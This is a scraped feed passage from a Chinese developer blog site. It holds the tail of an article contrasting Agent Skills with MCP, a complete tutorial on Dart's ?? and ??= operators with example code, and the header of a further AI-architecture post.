<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8f22fc0cb6164f4687fd10a1cb87ac8b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lit5p2v5Y-v5LmQ5aSa5Yqg5Yaw:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770692551&amp;x-signature=VrppYttliscPsf0Ou%2BG6oNWHUcA%3D" alt="在这里插入图片描述" loading="lazy"/></p>
<p><strong>Agent Skills 的哲学</strong>可以概括为“<strong>知识即文件，能力即目录</strong>”。它将领域专业知识、操作指南和可执行代码视为一种可被文件化、可被版本控制的“知识资产”。这种设计哲学强调<strong>便携性、可读性和低门槛的扩展性</strong>。一个 Skill 被创建后，其内容相对固定，AI 智能体通过解析 <code>SKILL.md</code> 文件来理解和执行其内部逻辑。这种模式更像是为 AI 智能体提供了一本本“参考手册”或“工具箱”，智能体根据任务需求查阅并使用。因此，Agent Skills 更擅长处理那些<strong>知识密集型、流程标准化且相对稳定的任务</strong>，例如文档分析、代码审查流程或特定的数据处理工作流。它的“无状态”特性意味着每次执行都是独立的，不依赖于持久化的连接或会话状态。</p>
<p><strong>MCP 的哲学</strong>则聚焦于“<strong>协议即桥梁，服务即能力</strong>”。它将外部工具、数据源和系统视为可被 AI 智能体通过标准化协议动态调用的“服务”。这种设计哲学强调<strong>实时性、互操作性和强大的外部集成能力</strong>。MCP 更适合处理那些<strong>需要实时数据访问、复杂系统集成以及动态能力协商的任务</strong>，例如实时监控、多系统编排或需要与外部 API 频繁交互的场景。它的“有状态”特性使得连接管理和会话保持成为可能，为复杂的交互提供了基础。</p>
<p>简而言之，Agent Skills 关注的是<strong>AI 智能体“内部”如何组织和利用自身或本地的能力</strong>，而 MCP 则着眼于<strong>AI 智能体“外部”如何与广阔的数字世界进行高效、安全的连接与交互</strong>。两者并非相互替代，而是相辅相成，共同构成了 AI 智能体能力扩展的完整图景。</p>
<h3 data-id="heading-12">3.2、技术指标横向评测</h3>
<p>为了更直观地理解 Agent Skills 和 MCP 在技术层面的差异，下表从多个关键维度对两者进行了横向对比。
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/54877442b3424c52ab68a943287b675b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lit5p2v5Y-v5LmQ5aSa5Yqg5Yaw:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770692551&amp;x-signature=W9ayT2AkNtFDSdtp9wsduklpF0k%3D" alt="在这里插入图片描述" loading="lazy"/></p>






































































<table><thead><tr><th align="left">维度</th><th align="left">Agent Skills</th><th align="left">MCP (Model Context Protocol)</th></tr></thead><tbody><tr><td align="left"><strong>架构范式</strong></td><td align="left">文件驱动，基于文件系统</td><td align="left">协议驱动，基于客户端-主机-服务器模型</td></tr><tr><td align="left"><strong>通信模型</strong></td><td align="left">直接文件系统访问，无协议开销</td><td align="left">JSON-RPC 2.0，双向消息交换</td></tr><tr><td align="left"><strong>状态管理</strong></td><td align="left">无状态（每次文件读取独立）</td><td align="left">有状态（管理连接生命周期）</td></tr><tr><td align="left"><strong>集成方式</strong></td><td align="left">低门槛，通过拖放文件到指定目录</td><td align="left">中等，需要 SDK 实现和配置</td></tr><tr><td align="left"><strong>安全性</strong></td><td align="left">沙箱执行，白名单机制</td><td align="left">OAuth 2.1 认证，传输层安全 (TLS)</td></tr><tr><td align="left"><strong>生态系统</strong></td><td align="left">正在成长中，Anthropic 等平台支持</td><td align="left">较为成熟，多语言 SDK，预构建服务器，调试工具</td></tr><tr><td align="left"><strong>便携性</strong></td><td align="left">极高，纯文件形式，易于分享和部署</td><td align="left">中等，需要运行服务器，部署相对复杂</td></tr><tr><td align="left"><strong>启动时间</strong></td><td align="left">极低，仅需读取元数据</td><td align="left">需连接握手，建立通信链路</td></tr><tr><td align="left"><strong>操作延迟</strong></td><td align="left">文件 I/O 操作</td><td align="left">网络通信 + 处理开销</td></tr><tr><td align="left"><strong>内存开销</strong></td><td align="left">低，按需加载（Load on demand）</td><td align="left">线性增长，取决于连接数和服务器容量</td></tr><tr><td align="left"><strong>可伸缩性</strong></td><td align="left">线性增长，取决于技能数量</td><td align="left">取决于服务器容量和架构设计</td></tr><tr><td align="left"><strong>最佳应用</strong></td><td align="left">知识打包、标准化工作流、离线环境</td><td align="left">外部系统集成、实时数据访问、企业级工作流</td></tr></tbody></table>
<p>从上表可以看出，Agent Skills 在<strong>便携性、低集成门槛和无状态操作</strong>方面表现出色，特别适合于封装相对独立的领域知识和标准化工作流，或者在资源受限、离线环境中运行。其文件驱动的特性使得技能的创建和分享变得异常简单，开发者可以像管理代码库一样管理技能，实现快速迭代和部署。</p>
<p>而 MCP 则在<strong>外部系统集成、实时数据交互和企业级应用</strong>方面具有显著优势。其协议驱动的模式提供了强大的互操作性，能够将 AI 智能体与各种复杂的外部服务（如数据库、API、遗留系统）无缝连接。MCP 的有状态连接管理和安全机制，使其成为构建高可靠、高性能 AI 智能体应用的关键基础设施。</p>
<h3 data-id="heading-13">3.3、生态位定位：互补而非竞争</h3>
<p>回看 Agent Skills 与 MCP 的差异，会发现它们并不是在同一条赛道上竞争。MCP 解决的是连接问题，它关心的是如何让 AI 智能体安全、稳定、标准化地接入外部世界；而 Agent Skills 解决的，则是一个更贴近日常工作的问题——智能体到底是以什么形式“学会”一件事的。它们并非相互竞争的关系，而是在 AI 智能体生态系统中扮演着<strong>互补的角色</strong>。将两者结合使用，可以构建出更加强大、灵活且适应性强的 AI 智能体。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8bc89588197e4c63aa36fa43a56ad403~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lit5p2v5Y-v5LmQ5aSa5Yqg5Yaw:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770692551&amp;x-signature=aWNT5VV45cyEFuRcDb3Y4oq7Q1k%3D" alt="在这里插入图片描述" loading="lazy"/></p>
<p>我们可以将 Agent Skills 视为 AI 智能体的**“内部知识库”和“本地工具集”**。它定义了 <strong>AI 智能体“应该知道什么”以及“如何处理问题”</strong>。例如，一个 Agent Skills 可以封装一套完整的法律文档审查流程，包括如何识别关键条款、如何提取特定信息、以及如何生成合规性报告。这些知识和流程是智能体自身能力的体现，可以在没有外部网络连接的情况下独立运行，或者作为更复杂任务的基础。</p>
<p>而 MCP 则可以看作是 AI 智能体与“<strong>外部世界”进行交互的“通用接口</strong>”。它定义了 AI 智能体“可以与哪些外部系统交互”以及“如何进行高效、安全的交互”。例如，<strong>当 AI 智能体需要查询最新的市场数据、调用第三方支付接口、或者与企业内部的 CRM 系统同步信息时</strong>，MCP 就能提供标准化的通信机制。它使得 AI 智能体能够突破自身的边界，利用外部服务的强大能力。</p>
<p>因此，在构建复杂的 AI 智能体系统时，最佳实践往往是<strong>采用混合方法</strong>：</p>
<ul>
<li><strong>利用 Agent Skills 封装领域专业知识和标准化工作流</strong>：这包括那些相对稳定、可复用、且对外部依赖较少的能力。例如，特定的数据清洗逻辑、报告生成模板、或内部决策流程。</li>
<li><strong>利用 MCP 实现与外部系统和服务的集成</strong>：这包括那些需要实时数据、动态交互、或者涉及复杂认证和授权的外部能力。例如，访问云数据库、调用第三方 API、或者与企业级应用进行数据同步。</li>
</ul>
<p>通过这种方式，AI 智能体可以拥有一个强大且便携的“大脑”（由 Agent Skills 提供），同时也能拥有灵活且高效的“手脚”（由 MCP 提供），从而在各种复杂的应用场景中发挥出最大的潜力。这种协同作用，使得 AI 智能体不仅能够“思考”，更能够“行动”，并与真实世界的数字基础设施无缝融合。</p>
<p><strong>【今日推荐】</strong>：一个<strong>更简单 更智能的全能网站搭建平台</strong>，低代码开发工具RollCode。轻松提升效率、释放开发潜力，快速验证您的每个创意，点击<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.rollcode.cn%2F%3Fsource%3Dba%26id%3Dkele" target="_blank" title="https://www.rollcode.cn/?source=ba&amp;id=kele" ref="nofollow noopener noreferrer">官网链接</a>直达体验：
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/31da84be1b0f4d80892fed24b7488968~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lit5p2v5Y-v5LmQ5aSa5Yqg5Yaw:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770692551&amp;x-signature=zdzQpCPAxsQFnMPNL2vxk8GmZG8%3D" alt="在这里插入图片描述" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Dart ——??运算符]]></title>    <link>https://juejin.cn/post/7602259669730246683</link>    <guid>https://juejin.cn/post/7602259669730246683</guid>    <pubDate>2026-02-03T03:31:14.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602259669730246683" data-draft-id="7602166907571912742" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Dart ——??运算符"/> <meta itemprop="keywords" content="Flutter,Dart"/> <meta itemprop="datePublished" content="2026-02-03T03:31:14.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Haha_bj"/> <meta itemprop="url" content="https://juejin.cn/user/2612027844214647"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Dart ——??运算符
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2612027844214647/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Haha_bj
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-03T03:31:14.000Z" title="Tue Feb 03 2026 03:31:14 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>你想了解 Dart 中的 <code>??</code> 运算符，它是 Dart 里处理 ** 可选值（可空类型）** 的常用运算符，核心作用是「空值合并」，我们从基础用法、核心特点、拓展用法到实际场景，一步步讲清楚，让你快速掌握。</p>
<h3 data-id="heading-0">一、先明确 <code>??</code> 运算符的核心定义</h3>
<p><code>??</code> 被称为 <strong>「空值合并运算符（Null Coalescing Operator）」</strong>，作用是：判断运算符<strong>左侧的表达式是否为 <code>null</code></strong>：</p>
<ul>
<li>如果<strong>左侧不为 <code>null</code></strong>，直接返回<strong>左侧的值</strong>；</li>
<li>如果<strong>左侧为 <code>null</code></strong>，返回<strong>右侧的备选值</strong>。</li>
</ul>
<p>简单理解：「选左边的，左边是空的就选右边的」，用于给可空变量设置默认值，避免空值引发错误。</p>
<h3 data-id="heading-1">二、基础用法（最常用场景）</h3>
<h4 data-id="heading-2">1. 基本语法格式</h4>
<pre><code class="hljs language-Dart" lang="Dart"><span class="hljs-comment">// 语法：左侧表达式 ?? 右侧备选值</span>
variable ?? defaultValue
</code></pre>
<h4 data-id="heading-3">2. 示例（基础场景）</h4>
<pre><code class="hljs language-Dart" lang="Dart"><span class="hljs-keyword">void</span> main() {
  <span class="hljs-comment">// 场景 1：左侧不为 null，返回左侧值</span>
  <span class="hljs-built_in">String?</span> name1 = <span class="hljs-string">"张三"</span>;
  <span class="hljs-built_in">String</span> result1 = name1 ?? <span class="hljs-string">"未知用户"</span>;
  <span class="hljs-built_in">print</span>(<span class="hljs-string">"result1: <span class="hljs-subst">$result1</span>"</span>); <span class="hljs-comment">// 输出：result1: 张三</span>

  <span class="hljs-comment">// 场景 2：左侧为 null，返回右侧默认值</span>
  <span class="hljs-built_in">String?</span> name2 = <span class="hljs-keyword">null</span>;
  <span class="hljs-built_in">String</span> result2 = name2 ?? <span class="hljs-string">"未知用户"</span>;
  <span class="hljs-built_in">print</span>(<span class="hljs-string">"result2: <span class="hljs-subst">$result2</span>"</span>); <span class="hljs-comment">// 输出：result2: 未知用户</span>

  <span class="hljs-comment">// 场景 3：结合数值类型使用</span>
  <span class="hljs-built_in">int?</span> age1 = <span class="hljs-number">20</span>;
  <span class="hljs-built_in">int</span> ageResult1 = age1 ?? <span class="hljs-number">18</span>;
  <span class="hljs-built_in">print</span>(<span class="hljs-string">"ageResult1: <span class="hljs-subst">$ageResult1</span>"</span>); <span class="hljs-comment">// 输出：ageResult1: 20</span>

  <span class="hljs-built_in">int?</span> age2 = <span class="hljs-keyword">null</span>;
  <span class="hljs-built_in">int</span> ageResult2 = age2 ?? <span class="hljs-number">18</span>;
  <span class="hljs-built_in">print</span>(<span class="hljs-string">"ageResult2: <span class="hljs-subst">$ageResult2</span>"</span>); <span class="hljs-comment">// 输出：ageResult2: 18</span>
}
</code></pre>
<h4 data-id="heading-4">3. 关键注意点</h4>
<ul>
<li>
<p><code>??</code> 只判断「左侧是否为 <code>null</code>」，<strong>不判断空字符串、0 等「空值但非 null」的情况</strong>：</p>
<pre><code class="hljs language-Dart" lang="Dart"><span class="hljs-keyword">void</span> main() {
  <span class="hljs-comment">// 左侧是空字符串（不是 null），返回左侧空字符串，而非右侧默认值</span>
  <span class="hljs-built_in">String?</span> emptyStr = <span class="hljs-string">""</span>;
  <span class="hljs-built_in">String</span> result = emptyStr ?? <span class="hljs-string">"默认字符串"</span>;
  <span class="hljs-built_in">print</span>(<span class="hljs-string">"result: '<span class="hljs-subst">$result</span>'"</span>); <span class="hljs-comment">// 输出：result: ''</span>
}
</code></pre>
</li>
<li>
<p>右侧的备选值<strong>只有在左侧为 <code>null</code> 时才会被执行</strong>（惰性求值），提升性能：</p>
<pre><code class="hljs language-Dart" lang="Dart"><span class="hljs-keyword">void</span> main() {
  <span class="hljs-built_in">String?</span> name = <span class="hljs-string">"李四"</span>;
  <span class="hljs-comment">// 因为左侧不为 null，右侧的 print 不会执行，也不会调用 getDefaultName()</span>
  <span class="hljs-built_in">String</span> result = name ?? (<span class="hljs-built_in">print</span>(<span class="hljs-string">"右侧执行了"</span>) + getDefaultName());
  <span class="hljs-built_in">print</span>(<span class="hljs-string">"result: <span class="hljs-subst">$result</span>"</span>);
}

<span class="hljs-built_in">String</span> getDefaultName() =&gt; <span class="hljs-string">"未知用户"</span>;
</code></pre>
<p>运行结果：仅输出 <code>result: 李四</code>，右侧的打印和函数调用都未执行。</p>
</li>
</ul>
<h3 data-id="heading-5">三、拓展用法：和其他运算符结合</h3>
<h4 data-id="heading-6">1. <code>??=</code>：空值赋值运算符（给变量本身设置默认值）</h4>
<p><code>??=</code> 是 <code>??</code> 的衍生运算符，作用是：<strong>如果变量本身为 <code>null</code>，就给它赋值右侧的值；如果变量不为 <code>null</code>，则不做任何修改</strong>（相当于「给变量设置默认值，仅在变量为空时生效」）。</p>
<pre><code class="hljs language-Dart" lang="Dart"><span class="hljs-keyword">void</span> main() {
  <span class="hljs-comment">// 场景 1：变量为 null，赋值右侧值</span>
  <span class="hljs-built_in">String?</span> name1 = <span class="hljs-keyword">null</span>;
  name1 ??= <span class="hljs-string">"王五"</span>;
  <span class="hljs-built_in">print</span>(<span class="hljs-string">"name1: <span class="hljs-subst">$name1</span>"</span>); <span class="hljs-comment">// 输出：name1: 王五</span>

  <span class="hljs-comment">// 场景 2：变量不为 null，不修改</span>
  <span class="hljs-built_in">String?</span> name2 = <span class="hljs-string">"赵六"</span>;
  name2 ??= <span class="hljs-string">"未知用户"</span>;
  <span class="hljs-built_in">print</span>(<span class="hljs-string">"name2: <span class="hljs-subst">$name2</span>"</span>); <span class="hljs-comment">// 输出：name2: 赵六</span>
}
</code></pre>
<p><strong>对比 <code>??</code> 和 <code>??=</code></strong>：</p>
<ul>
<li><code>name ?? "未知"</code>：返回一个值，<strong>不修改 <code>name</code> 本身</strong>；</li>
<li><code>name ??= "未知"</code>：直接<strong>修改 <code>name</code> 本身</strong>（仅当 <code>name</code> 为 <code>null</code> 时）。</li>
</ul>
<h4 data-id="heading-7">2. <code>?.</code> + <code>??</code>：安全访问 + 空值兜底（高频组合）</h4>
<p><code>?.</code> 是「安全访问运算符」，作用是：如果对象不为 <code>null</code>，就访问对象的属性 / 方法；如果对象为 <code>null</code>，则返回 <code>null</code>（避免空指针异常）。</p>
<p>两者结合，可实现「安全访问属性，若对象为空或属性为空，就返回默认值」，是业务开发中的高频组合。</p>
<pre><code class="hljs language-Dart" lang="Dart"><span class="hljs-comment">// 定义一个用户类</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>{
  <span class="hljs-built_in">String?</span> name;
  User(<span class="hljs-keyword">this</span>.name);
}

<span class="hljs-keyword">void</span> main() {
  <span class="hljs-comment">// 场景 1：对象不为 null，属性也不为 null</span>
  User? user1 = User(<span class="hljs-string">"钱七"</span>);
  <span class="hljs-built_in">String</span> result1 = user1?.name ?? <span class="hljs-string">"未知用户"</span>;
  <span class="hljs-built_in">print</span>(<span class="hljs-string">"result1: <span class="hljs-subst">$result1</span>"</span>); <span class="hljs-comment">// 输出：result1: 钱七</span>

  <span class="hljs-comment">// 场景 2：对象不为 null，但属性为 null</span>
  User? user2 = User(<span class="hljs-keyword">null</span>);
  <span class="hljs-built_in">String</span> result2 = user2?.name ?? <span class="hljs-string">"未知用户"</span>;
  <span class="hljs-built_in">print</span>(<span class="hljs-string">"result2: <span class="hljs-subst">$result2</span>"</span>); <span class="hljs-comment">// 输出：result2: 未知用户</span>

  <span class="hljs-comment">// 场景 3：对象本身为 null</span>
  User? user3 = <span class="hljs-keyword">null</span>;
  <span class="hljs-built_in">String</span> result3 = user3?.name ?? <span class="hljs-string">"未知用户"</span>;
  <span class="hljs-built_in">print</span>(<span class="hljs-string">"result3: <span class="hljs-subst">$result3</span>"</span>); <span class="hljs-comment">// 输出：result3: 未知用户</span>
}
</code></pre>
<h3 data-id="heading-8">四、实际业务场景示例</h3>
<h4 data-id="heading-9">1. 接口返回数据兜底（避免空值展示）</h4>
<pre><code class="hljs language-Dart" lang="Dart"><span class="hljs-comment">// 模拟接口返回的用户数据（可能为 null）</span>
<span class="hljs-built_in">Map</span>&lt;<span class="hljs-built_in">String</span>, <span class="hljs-built_in">dynamic</span>&gt;? apiResponse = {
  <span class="hljs-string">"username"</span>: <span class="hljs-string">"小明"</span>,
  <span class="hljs-string">"age"</span>: <span class="hljs-keyword">null</span>,
  <span class="hljs-string">"address"</span>: <span class="hljs-string">""</span>
};

<span class="hljs-keyword">void</span> main() {
  <span class="hljs-comment">// 提取用户名，为空则显示「游客」</span>
  <span class="hljs-built_in">String</span> username = apiResponse?[<span class="hljs-string">"username"</span>] ?? <span class="hljs-string">"游客"</span>;
  <span class="hljs-comment">// 提取年龄，为空则默认 18</span>
  <span class="hljs-built_in">int</span> age = apiResponse?[<span class="hljs-string">"age"</span>] ?? <span class="hljs-number">18</span>;
  <span class="hljs-comment">// 提取地址，为空字符串（非 null）则显示「未填写地址」（需额外判断）</span>
  <span class="hljs-built_in">String</span> address = apiResponse?[<span class="hljs-string">"address"</span>] ?? <span class="hljs-string">"未填写地址"</span>;
  address = address.isEmpty ? <span class="hljs-string">"未填写地址"</span> : address;

  <span class="hljs-built_in">print</span>(<span class="hljs-string">"用户名：<span class="hljs-subst">$username</span>，年龄：<span class="hljs-subst">$age</span>，地址：<span class="hljs-subst">$address</span>"</span>);
  <span class="hljs-comment">// 输出：用户名：小明，年龄：18，地址：未填写地址</span>
}
</code></pre>
<h4 data-id="heading-10">2. 初始化可空变量的默认值</h4>
<pre><code class="hljs language-Dart" lang="Dart"><span class="hljs-comment">// 定义可空的配置变量</span>
<span class="hljs-built_in">String?</span> appTitle;
<span class="hljs-built_in">int?</span> appVersionCode;

<span class="hljs-keyword">void</span> initAppConfig() {
  <span class="hljs-comment">// 给配置设置默认值（仅当变量为 null 时生效）</span>
  appTitle ??= <span class="hljs-string">"我的Dart应用"</span>;
  appVersionCode ??= <span class="hljs-number">1</span>;
}

<span class="hljs-keyword">void</span> main() {
  initAppConfig();
  <span class="hljs-built_in">print</span>(<span class="hljs-string">"应用标题：<span class="hljs-subst">$appTitle</span>，版本号：<span class="hljs-subst">$appVersionCode</span>"</span>);
  <span class="hljs-comment">// 输出：应用标题：我的Dart应用，版本号：1</span>
}
</code></pre>
<h3 data-id="heading-11">总结</h3>
<ol>
<li><code>??</code> 是<strong>空值合并运算符</strong>，核心逻辑：「左侧非空返左侧，左侧为空返右侧」，用于给可空变量兜底。</li>
<li>关键特性：只判断 <code>null</code>、右侧惰性求值、不修改原变量。</li>
<li>常用拓展：<code>??=</code> 用于给变量本身设置默认值（仅为空时生效）；<code>?. + ??</code> 用于安全访问对象属性并兜底。</li>
<li>实际场景：接口数据兜底、变量默认值初始化、避免空指针异常，是 Dart 开发中的必备语法。</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[从模型到落地：AI 认知架构全景与编排实战（含 RAG、Dify/LangChain、沙箱与提示词）]]></title>    <link>https://juejin.cn/post/7602154171109261375</link>    <guid>https://juejin.cn/post/7602154171109261375</guid>    <pubDate>2026-02-03T03:30:17.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602154171109261375" data-draft-id="7602176198874431531" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="从模型到落地：AI 认知架构全景与编排实战（含 RAG、Dify/LangChain、沙箱与提示词）"/> <meta itemprop="keywords" content="前端,JavaScript"/> <meta itemprop="datePublished" content="2026-02-03T03:30:17.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Manshawar"/> <meta itemprop="url" content="https://juejin.cn/user/1832206145692247"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            从模型到落地：AI 认知架构全景与编排实战（含 RAG、Dify/LangChain、沙箱与提示词）
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1832206145692247/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Manshawar
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-03T03:30:17.000Z" title="Tue Feb 03 2026 03:30:17 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-03
